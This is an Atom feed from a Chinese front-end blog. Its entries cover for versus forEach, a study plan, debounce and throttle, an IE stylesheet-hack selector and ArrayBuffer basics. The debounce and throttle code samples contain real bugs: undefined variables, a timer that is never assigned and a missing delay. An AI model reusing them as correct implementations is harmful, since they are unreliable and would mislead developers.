<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>淡夏的绿茶</title>
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://summerGreenTea.github.io/"/>
  <updated>2016-09-06T14:32:25.000Z</updated>
  <id>http://summerGreenTea.github.io/</id>
  
  <author>
    <name>summer</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>javascript-for-loop-vs-array-foreach</title>
    <link href="http://summerGreenTea.github.io/2016/08/14/javascript-for-loop-vs-array-foreach/"/>
    <id>http://summerGreenTea.github.io/2016/08/14/javascript-for-loop-vs-array-foreach/</id>
    <published>2016-08-14T05:01:20.000Z</published>
    <updated>2016-09-06T14:32:25.000Z</updated>
    
    <content type="html"><![CDATA[<blockquote>
<p>原文链接<a href="http://thejsguy.com/2016/07/30/javascript-for-loop-vs-array-foreach.html?utm_source=javascriptweekly&amp;utm_medium=email" target="_blank" rel="external">The for Loop vs. forEach in JavaScript</a></p>
</blockquote>
<p>最初在看到这篇文章的时候是在<strong>JSweekly</strong>上，自己觉得是一篇不错的文章，于是还是用自己的渣渣的英文水平来翻译下。人生中第一次翻译英文文章，还请多多指教。</p>
<a id="more"></a>
<p>如果你是一个javascript新手，你可能想知道古典的<strong>for</strong>循环对比数组上的<strong>forEach()</strong>方法有什么不同。在这篇文章，我将会回顾它们的工作方式然后讨论为什么我会选择用它们其中的一个使用。</p>
<h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><p>让我们看看标准<strong>for</strong>循环和<strong>forEach()</strong>方法的结构.</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(var <span class="built_in">i</span> = <span class="number">0</span>; <span class="built_in">i</span> &lt; <span class="number">3</span>; <span class="built_in">i</span>++) &#123;</div><div class="line">	console.log(i);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p><strong>for</strong>需要使用3个声明.第一个声明<code>var i = 0;</code>在循环开始之前执行.第二个声明<code>i &lt; 3</code>定义了在包含块里面的代码的运行条件.第三个声明是在每次循环结束后执行.这个循环的结果就是执行<code>console.log()</code>3次，结果依次是0,1和2.</p>
<p>下面，我们有个<strong>products</strong>的数组:</p>
<figure class="highlight groovy"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">var products = [</div><div class="line">  &#123; <span class="string">name:</span> <span class="string">'Running shoes'</span>, <span class="string">price:</span> <span class="number">75</span> &#125;,</div><div class="line">  &#123; <span class="string">name:</span> <span class="string">'Golf shoes'</span>,    <span class="string">price:</span> <span class="number">85</span> &#125;,</div><div class="line">  &#123; <span class="string">name:</span> <span class="string">'Dress shoes'</span>,   <span class="string">price:</span> <span class="number">95</span> &#125;,</div><div class="line">  &#123; <span class="string">name:</span> <span class="string">'Walking shoes'</span>, <span class="string">price:</span> <span class="number">65</span> &#125;,</div><div class="line">  &#123; <span class="string">name:</span> <span class="string">'Sandals'</span>,       <span class="string">price:</span> <span class="number">55</span> &#125;</div><div class="line">];</div></pre></td></tr></table></figure>
<p>如果我们想要循环每个产品的信息，我们需要改变<strong>for</strong>循环的条件，然后使用<strong>i</strong>作为索引去获取到当前遍历的产品信息.</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span>(var <span class="built_in">i</span> = <span class="number">0</span>; <span class="built_in">i</span> &lt; products.<span class="built_in">length</span>; <span class="built_in">i</span>++) &#123;</div><div class="line">	console.log(products[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>数组的<strong>forEach()</strong>方法也可以被用来实现相同的事情:</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">products.forEach(<span class="function"><span class="keyword">function</span><span class="params">(product, index)</span></span> &#123;</div><div class="line">	console.<span class="built_in">log</span>(<span class="built_in">product</span>);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>因为<strong>products</strong>是一个数组，它继承了所有在<strong>Array.prototype</strong>上面的方法，比如我们可以传递一个函数给被调用的<strong>Array.prototype.forEach()</strong>方法，这个函数在每次遍历执行的过程中，都会被传入遍历的<code>product</code>.</p>
<p>现在，我们来看看我为什么会选择他们其中的一个去使用.</p>
<h2 id="for-VS-forEach"><a href="#for-VS-forEach" class="headerlink" title="for VS forEach()"></a>for VS forEach()</h2><ol>
<li>使用forEach()会增加可阅读性<br><strong>for</strong>循环和<strong>forEach()</strong>方法都允许我们去循环一个数组，但是现在我将来说说我为什么在大多数的时间里都更加喜欢使用<strong>froEach()</strong>.在下面的例子中，每次遍历，<code>product</code>都会被传入回调函数中。我不需要去通过临时变量<code>i</code>例如<code>products[i]</code>来获取当前遍历的<code>product</code>.当你添加更多的代码的时候，即使这么做也不是很难去阅读代码，但会显得更加多余了。想象下如果你的for循环里面还有一个for循环，就像这样:</li>
</ol>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="built_in">var</span> i = <span class="number">0</span>; i &lt; products.<span class="built_in">length</span>; i++) &#123;</div><div class="line">  console.<span class="built_in">log</span>(products[i]);</div><div class="line">  <span class="keyword">for</span> (<span class="built_in">var</span> j = <span class="number">0</span>; j &lt; products[i].sizes.<span class="built_in">length</span>; j++) &#123;</div><div class="line">    console.<span class="built_in">log</span>(products[i].sizes[j]);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>当你的操作不仅仅只是一个console.log()的时候，这个阅读起来会更加困难。</p>
<figure class="highlight maxima"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (<span class="built_in">var</span> i = <span class="number">0</span>; i &lt; products.<span class="built_in">length</span>; i++) &#123;</div><div class="line">  <span class="built_in">var</span> <span class="built_in">product</span> = products[i];</div><div class="line">  console.<span class="built_in">log</span>(<span class="built_in">product</span>);</div><div class="line">  <span class="keyword">for</span> (<span class="built_in">var</span> j = <span class="number">0</span>; j &lt; <span class="built_in">product</span>.sizes.<span class="built_in">length</span>; j++) &#123;</div><div class="line">    <span class="built_in">var</span> size = <span class="built_in">product</span>.sizes[j];</div><div class="line">    console.<span class="built_in">log</span>(size);</div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>变量product和size几乎是没有帮助的，而且我也不喜欢i、j临时变量.现在我们通过下面的代码来比较下forEach()：</p>
<figure class="highlight fortran"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">products.forEach(<span class="function"><span class="keyword">function</span><span class="params">(product)</span></span> &#123;</div><div class="line">  <span class="built_in">product</span>.sizes.forEach(<span class="function"><span class="keyword">function</span><span class="params">(size)</span></span> &#123;</div><div class="line">    console.<span class="built_in">log</span>(<span class="built_in">size</span>);</div><div class="line">  &#125;);</div><div class="line">&#125;);</div></pre></td></tr></table></figure>
<p>这里不仅仅是少了几行代码，我们也不需要添加i、j等计数的临时变量.</p>
<ol>
<li>forEach()有更少的<code>off-by-one</code>错误</li>
</ol>
<p>Wikipedia对<code>off-by-one</code>的定义:</p>
<p>有一些方式可以产生<em>off-by-one</em>的错误，但是这里有一个简单的例子。</p>
<figure class="highlight matlab"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">for</span> (var <span class="built_in">i</span> = <span class="number">0</span>; <span class="built_in">i</span> &lt;= products.<span class="built_in">length</span>; <span class="built_in">i</span>++) &#123;</div><div class="line">  console.log(products[i]);</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>这个for循环开起来不是和文章开头那么很像吗？这里有个很小的不同点。注意for循环的第二个语句，这里的条件语句现在包含的是&lt;=而不是=。作为一个结果，这个循环将会多跑一次。即使这是个很小的例子，但是如果你不注意的话，这些类型的错误就会发生。当使用forEach()方法时，你一点都不需要去考虑这个条件语句</p>
<ol>
<li>更早的跳出循环<br>有一个情节我选择for循环而不是forEach()方法就是我想更早的太哦出循环。想象下我有个很长的products列表，我想尽快的找到符合条件的结果，然后做一些操作。如果我使用forEach()，它将会在一些没有必要遍历的结果中去遍历单个product，当数组很长的情况下这可能会引起一些性能问题。而使用for循环，你就拥有了跳出或阻止循环的能力。例如:</li>
</ol>
<figure class="highlight lisp"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">for (<span class="name">var</span> i = <span class="number">0</span><span class="comment">; i &lt; products.length; i++) &#123;</span></div><div class="line">  if (<span class="name">matchesSomeCriteria</span>(<span class="name">products</span>[i])) &#123;</div><div class="line">    doSomething()<span class="comment">;</span></div><div class="line">    break<span class="comment">;</span></div><div class="line">  &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>使用break关键字，当我们找到了正在找的内容时，我们可以尽可能快的在持续遍历的过程中停止循环。这个在ES6中根本算不上什么，ES6有个新的数组方法可以帮我们做类似的操作。这个方法就是find()，我也鼓励你去使用它。然后，在写这篇文章的时间节点上，并不是所有浏览器都已经支持，所以你可能需要使用Babel这样的转换器或者价格polyfill。<br>总结<br>这篇文章并没有很详尽的列出你什么时候该使用for循环，反之亦然，但是我列举了很多我在使用它们其中一个的场景。有一件事情我没有提到的是性能。如果你看了for循环和forEach()的性能比较的话，for循环会更快一些。然而，很多时候，这种性能差异在你的应用当中几乎是体现不出来的，选择使用for循环而不是forEach()其实是一种<em>premature optimization(过早优化)</em>。反而，优化代码的可读性可以确保我们在长期的维护过程中更加容易一点。当使用forEach()的性能存在问题是，然后换成for循环再看看它是否有什么不同。</p>
]]></content>
    
    <summary type="html">
    
      &lt;blockquote&gt;
&lt;p&gt;原文链接&lt;a href=&quot;http://thejsguy.com/2016/07/30/javascript-for-loop-vs-array-foreach.html?utm_source=javascriptweekly&amp;amp;utm_medium=email&quot;&gt;The for Loop vs. forEach in JavaScript&lt;/a&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;最初在看到这篇文章的时候是在&lt;strong&gt;JSweekly&lt;/strong&gt;上，自己觉得是一篇不错的文章，于是还是用自己的渣渣的英文水平来翻译下。人生中第一次翻译英文文章，还请多多指教。&lt;/p&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
      <category term="翻译" scheme="http://summerGreenTea.github.io/tags/%E7%BF%BB%E8%AF%91/"/>
    
  </entry>
  
  <entry>
    <title>个人的学习计划</title>
    <link href="http://summerGreenTea.github.io/2016/08/03/study-plan/"/>
    <id>http://summerGreenTea.github.io/2016/08/03/study-plan/</id>
    <published>2016-08-03T14:04:02.000Z</published>
    <updated>2016-08-07T16:23:42.000Z</updated>
    
    <content type="html"><![CDATA[<p>不知不觉，在公司已经实习了快一个半月了。这段时间，接到手的几个小项目也基本上算完成了，但是闲时，总是在想，自己收获了什么，这个时候的脑子基本上是乱的，因为自己总是在赶着进度去完成任务，想在实习期去尽快的多做出点成果来。这让我感到很惊慌，所以我现在急需要一份符合自己“属性“的学习计划来帮助我规划剩下的实习期。<br><a id="more"></a></p>
<h3 id="每天收集技术文档"><a href="#每天收集技术文档" class="headerlink" title="每天收集技术文档"></a>每天收集技术文档</h3><p>每天早上来公司的时候，习惯性的去查看自己订阅的技术性分享邮件，会去各个大公司前端团队的博客涉猎写新知识，但是这段时间太短了，还没来得及消化，就已经要进入工作的状态了。<br>所以，从现在开始，每天早上不再是”吸收消化”知识的过程，而是发现和收集的一个过程。这样，在每天下午下班(如果这个时候一天的工作已经完成)或晚上在公司的时间段去仔细阅读和消化这些收集的技术性文章，如果混的感悟深刻的话可以在博客上记录下自己学习到的东西，或者可以做成PPT的形式作为团队分享来展开。争取每天能去阅读两篇代表性的技术文章。</p>
<p>时间：早上9点20左右</p>
<p>形式：JSWeekly、CSS trick、Medium等博客或分享前端技术的微信公共号</p>
<h3 id="Github源码阅读"><a href="#Github源码阅读" class="headerlink" title="Github源码阅读"></a>Github源码阅读</h3><p>Github上面有大量优秀的开源项目，当然，各有各的特点和适用场景。自己在平时发现感兴趣的项目就star或watch一下，特别是在基础方面有很大学习空间的开源项目，坚持去读它们的源码，学习其中用到一些模式、代码规范、如何组织自己的代码。这个过程可以帮助我学习如何规划一个通用的框架或组件，平时的一些休息时间可以多去思考自己如何去实现这个项目所实现的一些功能，自己实现的话有哪些局限性，并带着疑问去阅读和学习源代码。</p>
<p>时间：周末</p>
<p>形式：平时star的github项目</p>
<h3 id="看书"><a href="#看书" class="headerlink" title="看书"></a>看书</h3><p>自己带着的专业书籍一大堆，但是却很少仔细去翻阅。书籍的知识算是最权威和最具有代表性的。周末的时间来公司可以多去翻阅这些书籍，在感受深刻的地方可以在具体化的去查阅更多资料来形成一个知识体系，这些都是可以写成博客和作为团队分享的形式去更好的帮助自己吸收和掌握这些知识。</p>
<p>时间：周末或节假日</p>
<p>形式：书籍</p>
<h3 id="review自己的代码"><a href="#review自己的代码" class="headerlink" title="review自己的代码"></a>review自己的代码</h3><p>在写完一个项目后，要花点时间去查看自己的代码。这个时候，因为在开发的过程中，会遇到很多代码中的BUG，要去分析原因。在这个过程中，咨客可以多去想想代码的可维护性、性能以及一些可以回出现的潜在问题，如何去规避这些问题等等。这个过程是最值得花时间去做的，而且这个过程应该用博客的方式去记录下来。</p>
<p>时间：项目交付或结项时安排一个周末</p>
<p>形式：项目代码</p>
<h3 id="个人习惯约束"><a href="#个人习惯约束" class="headerlink" title="个人习惯约束"></a>个人习惯约束</h3><p>1、远离手机<br>2、午休的时候看NBA不能超过20分钟<br>3、每天早中晚三餐一定要吃<br>4、不能再晚上回去吃烧烤(很上火)<br>5、每周两篇博客<br>6、9点10分之前到公司<br>7、如果不是有事情，晚上10：40下班离开公司</p>
<p>时间：无</p>
<p>形式：无</p>
<h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>好好学习，天天向上。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;不知不觉，在公司已经实习了快一个半月了。这段时间，接到手的几个小项目也基本上算完成了，但是闲时，总是在想，自己收获了什么，这个时候的脑子基本上是乱的，因为自己总是在赶着进度去完成任务，想在实习期去尽快的多做出点成果来。这让我感到很惊慌，所以我现在急需要一份符合自己“属性“的学习计划来帮助我规划剩下的实习期。&lt;br&gt;
    
    </summary>
    
    
      <category term="个人发展" scheme="http://summerGreenTea.github.io/tags/%E4%B8%AA%E4%BA%BA%E5%8F%91%E5%B1%95/"/>
    
  </entry>
  
  <entry>
    <title>javascript函数高级应用系列之-debounce、throttle</title>
    <link href="http://summerGreenTea.github.io/2016/07/31/debounce-throttle/"/>
    <id>http://summerGreenTea.github.io/2016/07/31/debounce-throttle/</id>
    <published>2016-07-31T13:02:12.000Z</published>
    <updated>2016-07-31T15:54:09.000Z</updated>
    
    <content type="html"><![CDATA[<p>Javascript是一门函数式语言，函<strong>第一公民</strong>的地位在Javascript的中重要性不言而喻。在平时的开发工作中，函数经常被当做封装一系列的通用操作的作用而存在，各种函数的<strong>奇淫巧技</strong>也都是五花八门，而在日常的工作中，一些函数的高级应用可以帮助我们解决很多棘手的问题，而且学习和掌握这些函数的原理能帮助我们更好的掌握函数式编程的精髓。这个系列的博客就记录一些平时学习和工作当中会碰到的一些函数高级应用。<br>这篇文章将要讲述的是<code>debounce</code>和<code>throttle</code>。<br><a id="more"></a></p>
<h3 id="前景"><a href="#前景" class="headerlink" title="前景"></a>前景</h3><p>上个礼拜接到个小小的改动需求，需要在一个输入框中加入一个人员选择器，作用就是当用户输入的时候，会自动判定用户输入并向后台提供的借口发送数据，后台将符合要求的人员名单返回，前端再将人员名单生成提示下拉菜单显示在输入框的后面。由于内部用人员选择器的组件，所以直接套上就用了，但是之后测试的时候就发现了问题了，人员选择器在响应用户输入的时候有轻微的卡顿，并且输入的速度越快，卡顿越明显。不用说，肯定是用户输入过快，向后台发送请求数过多导致的。</p>
<h3 id="debounce"><a href="#debounce" class="headerlink" title="debounce"></a>debounce</h3><p><strong>debounce</strong>中文解释为<strong>防反跳</strong>，意思就是在指定的一段时间内多次高速的执行某个操作的时候，将这段时间内的连续相同的操作合并为一次的操作去执行。<br>这个的应用场景非常广泛，除了之前提到的多次响应用户输入操作之外，在监听页面的滚动事件、浏览器的resize和表单提交等都有非常重要的应用。我们来看一个简单的实现：</p>
<pre><code>var debounce = function(fun, timeout) {
    var timer = null
    return function() {
        var context = this,
            args = arguments
        if(timer) clearTimeout(timer)
        setTimeout(function() {
            func.apply(context, args)
        })
    }
}
// example
window.onresize = debounce(dosomething, 300)
</code></pre><p>例子中，在浏览器<code>resize</code>的过程中，只有两次<code>resize</code>的时间间隔在300ms内，<code>dosomething</code>才会被执行。细心的朋友就会发现，<code>debounce</code>内指定的操作是在<code>timeout</code>后执行，也就是说，如果我们希望我们的操作需要立即停止连续响应操作后立即执行怎么办？那么久出现了下面的这种debounce写法:</p>
<pre><code>var debounce = function(fun, timeout, immediate) {
    var timer = null
    return function() {
        var context = this,
            args = arguments,
            later = function() {
                if(!immediate) {
                    fun.apply(context, args)
                }
            }
        var callNow = immediate &amp;&amp; !timer
        setTimeout(later, timerout)
        if(callNow) {
            fun.apply(context, args)
        }
    }
}
</code></pre><p><code>immediate</code>将会判定该操作是需要在<code>debounce</code>中立即执行还是延时<code>timeout</code>执行。</p>
<h3 id="throttle"><a href="#throttle" class="headerlink" title="throttle"></a>throttle</h3><p><strong>throttle</strong>意为函数节流，它和debounce不同的是，debounce是连续两次的操作时间间隔大于timeout才会去执行一次操作，而throttle是保证在连续的多次操作中，每隔timeout就会执行一次操作。</p>
<pre><code>var throttle = function(fun, timeout) {
    var last = 0
    return function() {
        var context = this,
            args = arguments
            now = Date.now()
        if(now - last &gt;= timeout) {
            fun.apply(context, argument)
            last = now
        }
    }
}
</code></pre><h3 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h3><p>关于<code>debounce</code>和<code>throttle</code>的理解就是这么多了，整篇博客的列出了一些实现代码都是个根据个人理解所写的，并没有很完善的封装，如果有需要更详细的了解一写细节的话可以去underscore的源码中查看具体实现。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;Javascript是一门函数式语言，函&lt;strong&gt;第一公民&lt;/strong&gt;的地位在Javascript的中重要性不言而喻。在平时的开发工作中，函数经常被当做封装一系列的通用操作的作用而存在，各种函数的&lt;strong&gt;奇淫巧技&lt;/strong&gt;也都是五花八门，而在日常的工作中，一些函数的高级应用可以帮助我们解决很多棘手的问题，而且学习和掌握这些函数的原理能帮助我们更好的掌握函数式编程的精髓。这个系列的博客就记录一些平时学习和工作当中会碰到的一些函数高级应用。&lt;br&gt;这篇文章将要讲述的是&lt;code&gt;debounce&lt;/code&gt;和&lt;code&gt;throttle&lt;/code&gt;。&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
      <category term="functions" scheme="http://summerGreenTea.github.io/tags/functions/"/>
    
  </entry>
  
  <entry>
    <title>css-getComputedStyle-currentStyle</title>
    <link href="http://summerGreenTea.github.io/2016/05/30/css-getComputedStyle-currentStyle/"/>
    <id>http://summerGreenTea.github.io/2016/05/30/css-getComputedStyle-currentStyle/</id>
    <published>2016-05-30T09:08:00.000Z</published>
    <updated>2016-07-31T13:07:38.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="css" scheme="http://summerGreenTea.github.io/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>Javascript 字符转化为数值</title>
    <link href="http://summerGreenTea.github.io/2016/05/30/the-differences-of-Number-parseInt-parsrFloat/"/>
    <id>http://summerGreenTea.github.io/2016/05/30/the-differences-of-Number-parseInt-parsrFloat/</id>
    <published>2016-05-30T02:03:30.000Z</published>
    <updated>2016-05-30T09:06:20.000Z</updated>
    
    <summary type="html">
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
  </entry>
  
  <entry>
    <title>利用styleSheet实现的Hack版JS选择器</title>
    <link href="http://summerGreenTea.github.io/2016/05/19/something-about-css-stylesheet/"/>
    <id>http://summerGreenTea.github.io/2016/05/19/something-about-css-stylesheet/</id>
    <published>2016-05-19T14:35:27.000Z</published>
    <updated>2016-05-27T12:32:36.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近看到<a href="http://www.barretlee.com/entry/" title="小胡子哥的博客" target="_blank" rel="external">小胡子哥的博客</a>，发现了他写的一个很简单JS选择器叫<strong>Mini Query</strong>,兼容IE6、7 起初只是抱着路过的状态的去看下这个库的代码，但当看到下面这段代码的时候，我有点不淡定了。</p>
<pre><code>var firstStyleSheet = document.styleSheets[0] || document.createStyleSheet();
firstStyleSheet.addRule(query, &apos;summer:yu&apos;);
for (var i = 0, len = document.all.length; i &lt; len; i++) {
  var item = document.all[i];
  item.currentStyle.Barret &amp;&amp; res.push(item);
}
firstStyleSheet.removeRule(0);
</code></pre><p>直怪自己太菜，于是开了个<code>issue</code>赶紧去问，胡子哥也耐心的回复了我，三言两语的讨论并不能解开我心中的疑惑，所以还是自己乖乖的去自行Google吧。</p>
<p>扯久了，进入正题。<br><a id="more"></a></p>
<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>查阅了相关资料以及一番测试后，自己也写了个类似的库，而且也修复了几个BUG，后期会继续完善，<a href="https://github.com/summerGreenTea/Mini-Query" target="_blank" rel="external">戳这里</a>。</p>
<h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>篇头贴出的那段代码是为了兼容低版本的IE6/7而做的处理。在IE8+以上的浏览器，是用<code>document.querySelectorAll</code>进行处理的。在低版本的IE中，我们可使用一种比较hack的写法，就是获取或者创建一个<a href="https://msdn.microsoft.com/zh-cn/library/ms531194(v=vs.85).aspx" target="_blank" rel="external">styleSheet</a>对象，然后调用<code>addRule</code>方法给我们的选择器添加一个样式规则，再获取到所有的文档节点，通过判断该节点是否拥有该CSS规则来返回结果集。为了不给我们的选择器匹配元素增加额外的样式，我们选择添加自定义的一个杨思归则，也就有了篇头提到的那段代码。</p>
<p>好吧！ 这代码写的有点奇淫技巧的味道啊！<br><img src="/2016/05/19/something-about-css-stylesheet/1.gif" alt="1.gif" title=""><br><code>firstStyleSheet.addRule(query, &#39;summer:yu&#39;)</code>是什么鬼。这里贴一下MSDN上关于<code>addRule</code>方法的文档：</p>
<pre><code>Integer* addRule(
     [in]           String        sSelector,
     [in]           String        sStyle,
     [in, optional] Integer iIndex = -1
   );
sSelector [in]
   String that specifies the selector for the new rule. Single contextual selectors are valid. For example, &quot;div p strong&quot; is a valid contextual selector.
sStyle [in]
   String that specifies the style assignments for this style rule. This style takes the same form as an inline style specification. For example, &quot;color:blue&quot; is a valid style parameter.
iIndex [in, optional]
   Integer that specifies the zero-based position in the rules collection where the new style rule should be placed.
Default(-1). The rule is added to the end of the collection.
</code></pre><p><code>addRule</code>只在IE8以下版本支持，在IE9+这个方法已经被加入DOM2级标准的[insertRule][addRule]所替代。<br>这段代码大概就是在我们样式表对象中给参数中选择器所指代的元素添加了一个“CSS规则”，addRule并不检查该规则正确与否。</p>
<h3 id="瞎扯"><a href="#瞎扯" class="headerlink" title="瞎扯"></a>瞎扯</h3><p>实在不知道给这段器什么标题，就叫瞎扯吧！</p>
<p>其实这段代码写的有问题，在IE7下(IETester奔溃了，IE6估计也一样)，<code>var firstStyleSheet = document.styleSheets[0] || document.createStyleSheet();</code>会报错，报错信息是这样的<code>SCRIPT5: 无效的过程调用或参数</code>。</p>
<p>原本以为<code>document.styleSheets</code>如果返回的是一个空的HTMLCollection对象，那么用数组下标的方式来访问这个对象，可能在IE7下就会报错，但是同样的方法用在<code>document.forms</code>或<code>doucment.all</code>上就不会出错，难道这又是IE6/7下的一个Bug。于是我就修改了下代码：</p>
<pre><code>var sheet = document.styleSheets.length &gt; 0 ? document.styleSheets[0] : document.createStyleSheet()
</code></pre><p>这样子就会正常运行(具体的报错原因还不得只，待后续补充)。</p>
]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近看到&lt;a href=&quot;http://www.barretlee.com/entry/&quot; title=&quot;小胡子哥的博客&quot;&gt;小胡子哥的博客&lt;/a&gt;，发现了他写的一个很简单JS选择器叫&lt;strong&gt;Mini Query&lt;/strong&gt;,兼容IE6、7 起初只是抱着路过的状态的去看下这个库的代码，但当看到下面这段代码的时候，我有点不淡定了。&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var firstStyleSheet = document.styleSheets[0] || document.createStyleSheet();
firstStyleSheet.addRule(query, &amp;apos;summer:yu&amp;apos;);
for (var i = 0, len = document.all.length; i &amp;lt; len; i++) {
  var item = document.all[i];
  item.currentStyle.Barret &amp;amp;&amp;amp; res.push(item);
}
firstStyleSheet.removeRule(0);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;直怪自己太菜，于是开了个&lt;code&gt;issue&lt;/code&gt;赶紧去问，胡子哥也耐心的回复了我，三言两语的讨论并不能解开我心中的疑惑，所以还是自己乖乖的去自行Google吧。&lt;/p&gt;
&lt;p&gt;扯久了，进入正题。&lt;br&gt;
    
    </summary>
    
    
      <category term="javascript" scheme="http://summerGreenTea.github.io/tags/javascript/"/>
    
      <category term="css" scheme="http://summerGreenTea.github.io/tags/css/"/>
    
  </entry>
  
  <entry>
    <title>学习ECMAScript6系列之二进制数组</title>
    <link href="http://summerGreenTea.github.io/2016/04/05/ArrayBuffer-TypeArray-DataView/"/>
    <id>http://summerGreenTea.github.io/2016/04/05/ArrayBuffer-TypeArray-DataView/</id>
    <published>2016-04-05T09:01:43.000Z</published>
    <updated>2016-07-31T13:05:08.000Z</updated>
    
    <content type="html"><![CDATA[<p>最近了解下了解关于<code>Web Audio API</code>相关的知识，其中就包括音频数据的传输和解析音频数据。在现代浏览器中，许多规范都制定出了对二进制数据处理的接口，我们可以很方便的用这些接口得到最原始的数据，诸如：FileReader、WebGL等。都需要对大量的原始数据进行处理，为了加快对于这些原始数据处理速度，提升性能，于是乎，在最新的ECMAScript6的规范中就推出了<code>二进制数组</code>来提高浏览器对二进制数据的处理能力,这也大大的提高了JS对数据的处理能力。<br><a id="more"></a></p>
<h3 id="开篇"><a href="#开篇" class="headerlink" title="开篇"></a>开篇</h3><p>二进制数组就是这篇文章要讲述的主题。它分为三个部分: </p>
<ul>
<li>ArrayBuffer</li>
<li>TypeArray</li>
<li>DataView</li>
</ul>
<h4 id="ArrayBuffer对象"><a href="#ArrayBuffer对象" class="headerlink" title="ArrayBuffer对象"></a>ArrayBuffer对象</h4><p>ArrayBuffer指向的是计算机内存中的一段连续存储空间，起初念起来让我想到了使用C语言中的malloc去向计算机申请一段内存空间，其实有点那个意思(我是那么理解的)。这段内存空间用来存储二进制数据。ArrayBuffer存储的二进制数据是不可被直接读取的，要用到<strong>视图</strong>去对数据进行分析处理才能读取，这个，我们后面会讲到。</p>
<p>可以通过实例的<code>byteLength</code>属性获取创建的内存空间大小(单位为字节)。还可以通过<code>slice()</code>方法来生成一个新的ArrayBuffer对象。</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">32</span>); <span class="comment">// 表示创建(申请)一段32个字节大小的内存空间</span></div><div class="line"><span class="built_in">console</span>.log(buffer.byteLength);     <span class="comment">// =&gt; 32</span></div><div class="line"></div><div class="line"><span class="keyword">const</span> newBuffer = buffer.slice(<span class="number">0</span>, <span class="number">3</span>); <span class="comment">// 类似数组的slice方法</span></div><div class="line"><span class="built_in">console</span>.log(newBuffer.byteLength); <span class="comment">// =&gt; 3</span></div></pre></td></tr></table></figure>
<h4 id="TypedArray视图DataView"><a href="#TypedArray视图DataView" class="headerlink" title="TypedArray视图DataView"></a>TypedArray视图DataView</h4><p>最早在<strong>Node.js</strong>中，就引入了TypedArray，目的是增强对Buffer的处理。TypedArray被视为”视图”，作用就是在其上指定ArrayBuffer对象，然后进行读写。TypeArray共有九种类型，表示以不同的数据类型来处理数据。</p>
<img src="/2016/04/05/ArrayBuffer-TypeArray-DataView/types.jpg" alt="types.jpg" title="">
<p>Uint8Array是以8位不带符号整数来处理数据，我们可以看下如何用<code>Uint8Array</code>来对ArrayBuffer进行操作。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">const</span> buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">10</span>);</div><div class="line"><span class="keyword">const</span> view = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>(buffer);</div><div class="line">view.length;        <span class="comment">// =&gt; 10</span></div></pre></td></tr></table></figure></p>
